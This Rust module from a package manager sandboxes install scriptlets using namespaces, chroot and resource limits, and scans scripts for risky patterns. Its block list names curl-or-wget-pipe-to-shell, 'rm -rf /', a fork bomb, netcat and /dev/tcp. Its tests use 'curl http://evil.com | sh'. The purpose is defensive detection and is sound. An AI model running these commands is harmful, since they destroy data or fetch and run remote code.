// src/container/mod.rs

//! Container isolation for scriptlet execution
//!
//! Provides lightweight Linux container isolation using namespaces to safely
//! execute package scriptlets. This protects the host system from malicious
//! or buggy scripts by:
//!
//! - Isolating process tree (PID namespace)
//! - Isolating hostname (UTS namespace)
//! - Isolating IPC resources (IPC namespace)
//! - Isolating filesystem with bind mounts (mount namespace)
//! - Applying resource limits (CPU, memory, time)
//!
//! Based on concepts from Aeryn OS / Serpent OS container isolation.

use crate::error::{Error, Result};
use nix::mount::{MsFlags, mount};
use nix::sched::{CloneFlags, unshare};
use nix::sys::signal::{Signal, kill};
use nix::sys::wait::{WaitStatus, waitpid};
use nix::unistd::{ForkResult, Pid, fork};
use std::fs::{self, File};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};
use tempfile::TempDir;
use tracing::{debug, warn};

/// Default resource limits for sandboxed execution
pub const DEFAULT_MEMORY_LIMIT: u64 = 512 * 1024 * 1024; // 512 MB
pub const DEFAULT_CPU_TIME_LIMIT: u64 = 60; // 60 seconds CPU time
pub const DEFAULT_FILE_SIZE_LIMIT: u64 = 100 * 1024 * 1024; // 100 MB max file size
pub const DEFAULT_NPROC_LIMIT: u64 = 64; // Max 64 processes

/// Severity levels for dangerous script detection
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ScriptRisk {
    /// Safe - no risky patterns detected
    Safe,
    /// Low risk - minor concerns
    Low,
    /// Medium risk - should probably sandbox
    Medium,
    /// High risk - definitely sandbox
    High,
    /// Critical - extremely dangerous patterns
    Critical,
}

impl ScriptRisk {
    pub fn as_str(&self) -> &'static str {
        match self {
            ScriptRisk::Safe => "safe",
            ScriptRisk::Low => "low",
            ScriptRisk::Medium => "medium",
            ScriptRisk::High => "high",
            ScriptRisk::Critical => "critical",
        }
    }
}

/// Result of analyzing a script for dangerous patterns
#[derive(Debug)]
pub struct ScriptAnalysis {
    /// Overall risk level
    pub risk: ScriptRisk,
    /// Dangerous patterns found
    pub patterns: Vec<String>,
    /// Recommendations
    pub recommendations: Vec<String>,
}

/// Paths to bind-mount into the container (read-only by default)
#[derive(Debug, Clone)]
pub struct BindMount {
    /// Source path on host
    pub source: PathBuf,
    /// Target path in container
    pub target: PathBuf,
    /// Whether to mount read-write (default is read-only)
    pub writable: bool,
}

impl BindMount {
    pub fn readonly(source: impl Into<PathBuf>, target: impl Into<PathBuf>) -> Self {
        Self {
            source: source.into(),
            target: target.into(),
            writable: false,
        }
    }

    pub fn writable(source: impl Into<PathBuf>, target: impl Into<PathBuf>) -> Self {
        Self {
            source: source.into(),
            target: target.into(),
            writable: true,
        }
    }
}

/// Configuration for container isolation
#[derive(Debug, Clone)]
pub struct ContainerConfig {
    /// Enable PID namespace isolation
    pub isolate_pid: bool,
    /// Enable UTS (hostname) namespace isolation
    pub isolate_uts: bool,
    /// Enable IPC namespace isolation
    pub isolate_ipc: bool,
    /// Enable mount namespace isolation
    pub isolate_mount: bool,
    /// Memory limit in bytes (0 = no limit)
    pub memory_limit: u64,
    /// CPU time limit in seconds (0 = no limit)
    pub cpu_time_limit: u64,
    /// Max file size in bytes (0 = no limit)
    pub file_size_limit: u64,
    /// Max number of processes (0 = no limit)
    pub nproc_limit: u64,
    /// Wall-clock timeout
    pub timeout: Duration,
    /// Hostname to use in container
    pub hostname: String,
    /// Paths to bind-mount into container
    pub bind_mounts: Vec<BindMount>,
    /// Working directory inside container
    pub workdir: PathBuf,
}

impl Default for ContainerConfig {
    fn default() -> Self {
        Self {
            isolate_pid: true,
            isolate_uts: true,
            isolate_ipc: true,
            isolate_mount: true,
            memory_limit: DEFAULT_MEMORY_LIMIT,
            cpu_time_limit: DEFAULT_CPU_TIME_LIMIT,
            file_size_limit: DEFAULT_FILE_SIZE_LIMIT,
            nproc_limit: DEFAULT_NPROC_LIMIT,
            timeout: Duration::from_secs(60),
            hostname: "conary-sandbox".to_string(),
            bind_mounts: default_bind_mounts(),
            workdir: PathBuf::from("/"),
        }
    }
}

impl ContainerConfig {
    /// Create a minimal config with just timeout (no namespace isolation)
    pub fn minimal(timeout: Duration) -> Self {
        Self {
            isolate_pid: false,
            isolate_uts: false,
            isolate_ipc: false,
            isolate_mount: false,
            memory_limit: 0,
            cpu_time_limit: 0,
            file_size_limit: 0,
            nproc_limit: 0,
            timeout,
            hostname: String::new(),
            bind_mounts: Vec::new(),
            workdir: PathBuf::from("/"),
        }
    }

    /// Create a strict config with maximum isolation
    pub fn strict() -> Self {
        Self {
            isolate_pid: true,
            isolate_uts: true,
            isolate_ipc: true,
            isolate_mount: true,
            memory_limit: DEFAULT_MEMORY_LIMIT,
            cpu_time_limit: DEFAULT_CPU_TIME_LIMIT,
            file_size_limit: DEFAULT_FILE_SIZE_LIMIT,
            nproc_limit: DEFAULT_NPROC_LIMIT,
            timeout: Duration::from_secs(30),
            hostname: "conary-sandbox".to_string(),
            bind_mounts: default_bind_mounts(),
            workdir: PathBuf::from("/"),
        }
    }

    /// Add a custom bind mount
    pub fn add_bind_mount(&mut self, mount: BindMount) {
        self.bind_mounts.push(mount);
    }
}

/// Get default bind mounts for scriptlet execution
fn default_bind_mounts() -> Vec<BindMount> {
    vec![
        // Essential system directories (read-only)
        BindMount::readonly("/usr", "/usr"),
        BindMount::readonly("/lib", "/lib"),
        BindMount::readonly("/lib64", "/lib64"),
        BindMount::readonly("/bin", "/bin"),
        BindMount::readonly("/sbin", "/sbin"),
        // Config files scripts might need
        BindMount::readonly("/etc/passwd", "/etc/passwd"),
        BindMount::readonly("/etc/group", "/etc/group"),
        BindMount::readonly("/etc/hosts", "/etc/hosts"),
        BindMount::readonly("/etc/resolv.conf", "/etc/resolv.conf"),
    ]
}

/// Container sandbox for executing scriptlets
pub struct Sandbox {
    config: ContainerConfig,
}

impl Sandbox {
    /// Create a new sandbox with the given configuration
    pub fn new(config: ContainerConfig) -> Self {
        Self { config }
    }

    /// Create a sandbox with default configuration
    pub fn with_defaults() -> Self {
        Self::new(ContainerConfig::default())
    }

    /// Create a strict sandbox with maximum isolation
    pub fn strict() -> Self {
        Self::new(ContainerConfig::strict())
    }

    /// Execute a script in the sandbox
    ///
    /// Returns the exit code and captured output.
    pub fn execute(
        &mut self,
        interpreter: &str,
        script_content: &str,
        args: &[String],
        env: &[(&str, &str)],
    ) -> Result<(i32, String, String)> {
        // Check if we can use namespace isolation (requires root)
        let use_isolation = self.config.isolate_mount && nix::unistd::geteuid().is_root();

        if use_isolation {
            self.execute_isolated(interpreter, script_content, args, env)
        } else {
            // Fall back to simple resource-limited execution
            if self.config.isolate_mount && !nix::unistd::geteuid().is_root() {
                warn!("Namespace isolation requires root privileges, falling back to resource limits only");
            }
            self.execute_limited(interpreter, script_content, args, env)
        }
    }

    /// Execute with full namespace isolation (requires root)
    fn execute_isolated(
        &mut self,
        interpreter: &str,
        script_content: &str,
        args: &[String],
        env: &[(&str, &str)],
    ) -> Result<(i32, String, String)> {
        // Create temporary root directory for the container
        let root_dir = TempDir::new()?;

        // Set up the container filesystem
        self.setup_container_fs(root_dir.path())?;

        // Write the script to execute
        let script_path = root_dir.path().join("script.sh");
        {
            let mut f = File::create(&script_path)?;
            f.write_all(script_content.as_bytes())?;
            let mut perms = fs::metadata(&script_path)?.permissions();
            perms.set_mode(0o700);
            fs::set_permissions(&script_path, perms)?;
        }

        // Fork and execute in isolated namespaces
        let start = Instant::now();

        match unsafe { fork() } {
            Ok(ForkResult::Parent { child }) => {
                // Parent: wait for child with timeout
                self.wait_for_child(child, start)
            }
            Ok(ForkResult::Child) => {
                // Child: set up namespaces and execute
                let result = self.child_setup_and_execute(
                    root_dir.path(),
                    interpreter,
                    &script_path,
                    args,
                    env,
                );

                // Exit with appropriate code
                std::process::exit(result.unwrap_or(127));
            }
            Err(e) => Err(Error::ScriptletError(format!("Fork failed: {}", e))),
        }
    }

    /// Execute with just resource limits (no namespace isolation)
    fn execute_limited(
        &self,
        interpreter: &str,
        script_content: &str,
        args: &[String],
        env: &[(&str, &str)],
    ) -> Result<(i32, String, String)> {
        let temp_dir = TempDir::new()?;
        let script_path = temp_dir.path().join("script.sh");

        {
            let mut f = File::create(&script_path)?;
            f.write_all(script_content.as_bytes())?;
            let mut perms = fs::metadata(&script_path)?.permissions();
            perms.set_mode(0o700);
            fs::set_permissions(&script_path, perms)?;
        }

        // Apply resource limits before exec
        self.apply_resource_limits()?;

        let mut cmd = Command::new(interpreter);
        cmd.arg(&script_path)
            .args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        for (key, value) in env {
            cmd.env(*key, *value);
        }

        let mut child = cmd.spawn()
            .map_err(|e| Error::ScriptletError(format!("Failed to spawn: {}", e)))?;

        // Wait with timeout using wait-timeout
        use wait_timeout::ChildExt;

        match child.wait_timeout(self.config.timeout)? {
            Some(status) => {
                let output = child.wait_with_output()?;
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                let code = status.code().unwrap_or(-1);
                Ok((code, stdout, stderr))
            }
            None => {
                let _ = child.kill();
                Err(Error::ScriptletError(format!(
                    "Script timed out after {:?}",
                    self.config.timeout
                )))
            }
        }
    }

    /// Set up the container filesystem with bind mounts
    fn setup_container_fs(&self, root: &Path) -> Result<()> {
        // Create essential directories
        for dir in &["dev", "etc", "proc", "sys", "tmp", "usr", "lib", "lib64", "bin", "sbin", "var"] {
            let path = root.join(dir);
            if !path.exists() {
                fs::create_dir_all(&path)?;
            }
        }

        // Create device node placeholders
        let dev = root.join("dev");
        for node in &["null", "zero", "urandom", "random"] {
            let path = dev.join(node);
            if !path.exists() {
                File::create(&path)?;
            }
        }

        Ok(())
    }

    /// Wait for child process with timeout
    fn wait_for_child(&self, child: Pid, start: Instant) -> Result<(i32, String, String)> {
        loop {
            // Check timeout
            if start.elapsed() > self.config.timeout {
                // Kill the child
                let _ = kill(child, Signal::SIGKILL);
                return Err(Error::ScriptletError(format!(
                    "Script timed out after {:?}",
                    self.config.timeout
                )));
            }

            // Non-blocking wait
            match waitpid(child, Some(nix::sys::wait::WaitPidFlag::WNOHANG)) {
                Ok(WaitStatus::Exited(_, code)) => {
                    return Ok((code, String::new(), String::new()));
                }
                Ok(WaitStatus::Signaled(_, sig, _)) => {
                    return Err(Error::ScriptletError(format!(
                        "Script killed by signal {:?}",
                        sig
                    )));
                }
                Ok(WaitStatus::StillAlive) => {
                    // Still running, sleep a bit
                    std::thread::sleep(Duration::from_millis(10));
                }
                Ok(_) => {
                    // Other status, keep waiting
                    std::thread::sleep(Duration::from_millis(10));
                }
                Err(e) => {
                    return Err(Error::ScriptletError(format!("Wait failed: {}", e)));
                }
            }
        }
    }

    /// Child process: set up namespaces and execute
    fn child_setup_and_execute(
        &self,
        root: &Path,
        interpreter: &str,
        script_path: &Path,
        args: &[String],
        env: &[(&str, &str)],
    ) -> Result<i32> {
        // Unshare namespaces
        let mut flags = CloneFlags::empty();
        if self.config.isolate_pid {
            flags |= CloneFlags::CLONE_NEWPID;
        }
        if self.config.isolate_uts {
            flags |= CloneFlags::CLONE_NEWUTS;
        }
        if self.config.isolate_ipc {
            flags |= CloneFlags::CLONE_NEWIPC;
        }
        if self.config.isolate_mount {
            flags |= CloneFlags::CLONE_NEWNS;
        }

        if !flags.is_empty() {
            unshare(flags).map_err(|e| Error::ScriptletError(format!("Unshare failed: {}", e)))?;
        }

        // Set hostname in UTS namespace
        if self.config.isolate_uts && !self.config.hostname.is_empty() {
            // Use libc directly for sethostname
            let hostname = std::ffi::CString::new(self.config.hostname.as_str())
                .map_err(|e| Error::ScriptletError(format!("Invalid hostname: {}", e)))?;
            unsafe {
                if libc::sethostname(hostname.as_ptr(), self.config.hostname.len()) != 0 {
                    warn!("sethostname failed");
                }
            }
        }

        // Set up mount namespace
        if self.config.isolate_mount {
            self.setup_mount_namespace(root)?;
        }

        // Apply resource limits
        self.apply_resource_limits()?;

        // Change to working directory
        std::env::set_current_dir(&self.config.workdir)
            .map_err(|e| Error::ScriptletError(format!("chdir failed: {}", e)))?;

        // Execute the script
        let mut cmd = Command::new(interpreter);
        cmd.arg(script_path)
            .args(args)
            .stdin(Stdio::null());

        for (key, value) in env {
            cmd.env(*key, *value);
        }

        let status = cmd.status()
            .map_err(|e| Error::ScriptletError(format!("Exec failed: {}", e)))?;

        Ok(status.code().unwrap_or(-1))
    }

    /// Set up mount namespace with bind mounts
    fn setup_mount_namespace(&self, root: &Path) -> Result<()> {
        // Make all mounts private so changes don't propagate to host
        mount::<str, str, str, str>(
            None,
            "/",
            None,
            MsFlags::MS_PRIVATE | MsFlags::MS_REC,
            None,
        ).map_err(|e| Error::ScriptletError(format!("mount --make-rprivate failed: {}", e)))?;

        // Perform bind mounts
        for bm in &self.config.bind_mounts {
            if !bm.source.exists() {
                debug!("Skipping bind mount, source doesn't exist: {:?}", bm.source);
                continue;
            }

            let target = root.join(bm.target.strip_prefix("/").unwrap_or(&bm.target));

            // Create target directory/file
            if bm.source.is_dir() {
                fs::create_dir_all(&target)?;
            } else {
                if let Some(parent) = target.parent() {
                    fs::create_dir_all(parent)?;
                }
                if !target.exists() {
                    File::create(&target)?;
                }
            }

            // Bind mount
            mount::<Path, Path, str, str>(
                Some(&bm.source),
                &target,
                None,
                MsFlags::MS_BIND,
                None,
            ).map_err(|e| {
                debug!("Bind mount {:?} -> {:?} failed: {}", bm.source, target, e);
                Error::ScriptletError(format!("Bind mount failed: {}", e))
            })?;

            // Remount read-only if needed
            if !bm.writable {
                mount::<Path, Path, str, str>(
                    None,
                    &target,
                    None,
                    MsFlags::MS_REMOUNT | MsFlags::MS_BIND | MsFlags::MS_RDONLY,
                    None,
                ).ok(); // Best effort
            }
        }

        // Use chroot instead of pivot_root (simpler and more portable)
        unsafe {
            let root_cstr = std::ffi::CString::new(root.to_string_lossy().as_ref())
                .map_err(|e| Error::ScriptletError(format!("Invalid root path: {}", e)))?;
            if libc::chroot(root_cstr.as_ptr()) != 0 {
                return Err(Error::ScriptletError("chroot failed".to_string()));
            }
            if libc::chdir(c"/".as_ptr()) != 0 {
                return Err(Error::ScriptletError("chdir after chroot failed".to_string()));
            }
        }

        Ok(())
    }

    /// Apply resource limits using setrlimit
    fn apply_resource_limits(&self) -> Result<()> {
        // Memory limit (address space)
        if self.config.memory_limit > 0 {
            let limit = libc::rlimit {
                rlim_cur: self.config.memory_limit,
                rlim_max: self.config.memory_limit,
            };
            unsafe {
                if libc::setrlimit(libc::RLIMIT_AS, &limit) != 0 {
                    warn!("setrlimit RLIMIT_AS failed");
                }
            }
        }

        // CPU time limit
        if self.config.cpu_time_limit > 0 {
            let limit = libc::rlimit {
                rlim_cur: self.config.cpu_time_limit,
                rlim_max: self.config.cpu_time_limit,
            };
            unsafe {
                if libc::setrlimit(libc::RLIMIT_CPU, &limit) != 0 {
                    warn!("setrlimit RLIMIT_CPU failed");
                }
            }
        }

        // File size limit
        if self.config.file_size_limit > 0 {
            let limit = libc::rlimit {
                rlim_cur: self.config.file_size_limit,
                rlim_max: self.config.file_size_limit,
            };
            unsafe {
                if libc::setrlimit(libc::RLIMIT_FSIZE, &limit) != 0 {
                    warn!("setrlimit RLIMIT_FSIZE failed");
                }
            }
        }

        // Process limit
        if self.config.nproc_limit > 0 {
            let limit = libc::rlimit {
                rlim_cur: self.config.nproc_limit,
                rlim_max: self.config.nproc_limit,
            };
            unsafe {
                if libc::setrlimit(libc::RLIMIT_NPROC, &limit) != 0 {
                    warn!("setrlimit RLIMIT_NPROC failed");
                }
            }
        }

        Ok(())
    }
}

/// Dangerous patterns to look for in scripts
const DANGEROUS_PATTERNS: &[(&str, ScriptRisk, &str)] = &[
    // Critical - remote code execution
    ("curl.*|.*sh", ScriptRisk::Critical, "Downloads and executes remote code"),
    ("wget.*|.*sh", ScriptRisk::Critical, "Downloads and executes remote code"),
    ("eval.*$", ScriptRisk::Critical, "Dynamic code execution"),

    // High - system modification
    ("rm -rf /", ScriptRisk::High, "Recursive deletion of root"),
    ("rm -rf /*", ScriptRisk::High, "Recursive deletion of root contents"),
    ("mkfs", ScriptRisk::High, "Filesystem formatting"),
    ("dd if=.* of=/dev/", ScriptRisk::High, "Direct device write"),
    (":(){ :|:& };:", ScriptRisk::High, "Fork bomb"),

    // Medium - privilege escalation or persistence
    ("chmod.*4[0-7][0-7][0-7]", ScriptRisk::Medium, "Setuid bit manipulation"),
    ("chmod.*u+s", ScriptRisk::Medium, "Setuid bit manipulation"),
    ("crontab", ScriptRisk::Medium, "Cron job modification"),
    ("/etc/shadow", ScriptRisk::Medium, "Password file access"),
    ("/etc/sudoers", ScriptRisk::Medium, "Sudo configuration access"),
    ("ssh.*authorized_keys", ScriptRisk::Medium, "SSH key manipulation"),

    // Low - potentially suspicious
    ("nc ", ScriptRisk::Low, "Netcat usage (network backdoor potential)"),
    ("ncat ", ScriptRisk::Low, "Ncat usage (network backdoor potential)"),
    ("/dev/tcp/", ScriptRisk::Low, "Bash TCP device (network comms)"),
    ("/dev/udp/", ScriptRisk::Low, "Bash UDP device (network comms)"),
    ("base64.*-d", ScriptRisk::Low, "Base64 decoding (obfuscation)"),
];

/// Analyze a script for dangerous patterns
pub fn analyze_script(content: &str) -> ScriptAnalysis {
    let mut patterns = Vec::new();
    let mut recommendations = Vec::new();
    let mut max_risk = ScriptRisk::Safe;

    let content_lower = content.to_lowercase();

    for (pattern, risk, description) in DANGEROUS_PATTERNS {
        // Simple pattern matching (could be improved with regex)
        let pattern_lower = pattern.to_lowercase();
        if content_lower.contains(&pattern_lower) ||
           (pattern.contains(".*") && fuzzy_match(&content_lower, &pattern_lower)) {
            patterns.push(format!("{} ({})", description, risk.as_str()));
            if *risk > max_risk {
                max_risk = *risk;
            }
        }
    }

    // Generate recommendations
    match max_risk {
        ScriptRisk::Safe => {
            recommendations.push("Script appears safe for execution".to_string());
        }
        ScriptRisk::Low => {
            recommendations.push("Consider sandboxing if running untrusted package".to_string());
        }
        ScriptRisk::Medium => {
            recommendations.push("Sandboxed execution recommended".to_string());
        }
        ScriptRisk::High | ScriptRisk::Critical => {
            recommendations.push("MUST sandbox this script".to_string());
            recommendations.push("Review script contents before execution".to_string());
        }
    }

    ScriptAnalysis {
        risk: max_risk,
        patterns,
        recommendations,
    }
}

/// Simple fuzzy pattern matching for .* patterns
fn fuzzy_match(content: &str, pattern: &str) -> bool {
    if !pattern.contains(".*") {
        return content.contains(pattern);
    }

    let parts: Vec<&str> = pattern.split(".*").collect();
    if parts.is_empty() {
        return false;
    }

    let mut pos = 0;
    for part in parts {
        if part.is_empty() {
            continue;
        }
        if let Some(found) = content[pos..].find(part) {
            pos += found + part.len();
        } else {
            return false;
        }
    }
    true
}

/// Check if namespace isolation is available
pub fn isolation_available() -> bool {
    // Check if we're root
    if nix::unistd::geteuid().is_root() {
        return true;
    }

    // Check for unprivileged user namespaces
    if let Ok(content) = fs::read_to_string("/proc/sys/kernel/unprivileged_userns_clone")
        && content.trim() == "1"
    {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_script_analysis_safe() {
        let script = "#!/bin/bash\necho 'Hello World'\nexit 0";
        let analysis = analyze_script(script);
        assert_eq!(analysis.risk, ScriptRisk::Safe);
        assert!(analysis.patterns.is_empty());
    }

    #[test]
    fn test_script_analysis_dangerous() {
        let script = "#!/bin/bash\nrm -rf /\nexit 0";
        let analysis = analyze_script(script);
        assert!(analysis.risk >= ScriptRisk::High);
        assert!(!analysis.patterns.is_empty());
    }

    #[test]
    fn test_script_analysis_medium() {
        let script = "#!/bin/bash\nchmod u+s /usr/bin/myapp\nexit 0";
        let analysis = analyze_script(script);
        assert!(analysis.risk >= ScriptRisk::Medium);
    }

    #[test]
    fn test_bind_mount_creation() {
        let ro = BindMount::readonly("/usr", "/usr");
        assert!(!ro.writable);
        assert_eq!(ro.source, PathBuf::from("/usr"));

        let rw = BindMount::writable("/tmp", "/tmp");
        assert!(rw.writable);
    }

    #[test]
    fn test_container_config_default() {
        let config = ContainerConfig::default();
        assert!(config.isolate_pid);
        assert!(config.isolate_mount);
        assert!(config.memory_limit > 0);
    }

    #[test]
    fn test_container_config_minimal() {
        let config = ContainerConfig::minimal(Duration::from_secs(30));
        assert!(!config.isolate_pid);
        assert!(!config.isolate_mount);
        assert_eq!(config.memory_limit, 0);
    }

    #[test]
    fn test_fuzzy_match() {
        assert!(fuzzy_match("curl http://evil.com | sh", "curl.*|.*sh"));
        assert!(fuzzy_match("wget http://evil.com | bash", "wget.*|.*sh"));
        assert!(!fuzzy_match("echo hello", "curl.*|.*sh"));
    }
}
